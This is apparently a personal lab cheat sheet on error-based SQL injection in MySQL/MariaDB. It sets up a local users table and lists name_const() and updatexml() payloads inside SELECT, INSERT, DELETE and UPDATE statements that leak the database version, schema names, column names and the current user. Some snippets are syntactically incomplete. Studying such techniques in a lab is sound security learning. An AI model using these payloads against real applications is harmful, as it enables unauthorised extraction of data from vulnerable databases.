# SQLi-select-insert-update-delete
- Create a db for the lab:
```
Create database newdb;
use newdb
CREATE TABLE users
(
id int(3) NOT NULL AUTO_INCREMENT,
username varchar(20) NOT NULL,
password varchar(20) NOT NULL,
PRIMARY KEY (id)
);
```
- Now let’s insert some sample data into our database. The syntax would be

```
insert into users (id, username, password) values (1, ‘Jane’, ‘Eyre’);
```
- Using name_const()
  
Syntax:
```
insert into users (id, username, password) values (1,"*(select*from(select(name_const(version(),1)),name_const(version(),1))a)* ", 'Eyre');
```
- Using updatexml()
  * The updatexml() function is an SQL function in MariaDB and MySQL commonly used to perform operations on XML data. However, when used with non-standard parameters or non-XML data, it can cause errors and this error message can sometimes display sensor information such as database version instead of . This is often leveraged in SQL injection attacks to get information from the database.
  
 Syntax
 
  updatexml(XML_document, XPath_string, new_value)

Syntax

  * Select
  ```
SELECT updatexml(1, concat(0x7e, database()), 0); //Dump current db name
  ```
  ```
SELECT updatexml(1, concat(0x7e, (SELECT group_concat(schema_name) FROM information_schema.schemata)), 0);//Dump list of db
  ```
  *  Insert:
    ```
    INSERT INTO users (id, username, password) VALUES (3, updatexml(1, concat(0x7e, (version())), 0), 'Eyre');
    ```
  *  Delete:
    ```
    DELETE FROM users WHERE id = 1 OR updatexml(1, concat(0x7e, version()), 0);
    ```
  * Update:
```
    UPDATE users SET password = 'dummy'
     WHERE id = 2 AND username = 'Nervo' OR updatexml(1, concat(0x7e, version()), 0);  //Statement AND is wrong and updatexml(1, concat(0x7e, version()), 0) is alway dump error -->it True
```
```
    SET password = (SELECT updatexml(1, concat(0x7e, version()), 0))
        WHERE id = 2 AND username = 'Nervo';
```
```
UPDATE users
SET password = 'dummy'
WHERE (id = 2 AND username = 'Nervo') OR updatexml(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database())), 0); //Dump list of comlumns
```
```
UPDATE users
SET password = 'dummy'
WHERE (id = 2 AND username = 'Nervo') OR updatexml(1, concat(0x7e, (SELECT user())), 0); // Dump curent user
```


    
    
